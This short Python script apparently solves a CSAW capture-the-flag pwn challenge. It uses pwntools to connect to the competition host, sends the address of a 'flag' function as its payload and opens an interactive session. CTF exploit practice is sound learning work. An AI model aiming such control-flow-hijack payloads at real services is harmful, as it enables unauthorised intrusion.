from pwn import *

flag_addr = 0x0000000000400717

host, port = "intro.csaw.io", 31138
conn = remote(host, port)

# payload = p64(flag_addr)
payload = b"0x000000400717"
print(payload)
conn.sendline(payload)

conn.interactive()
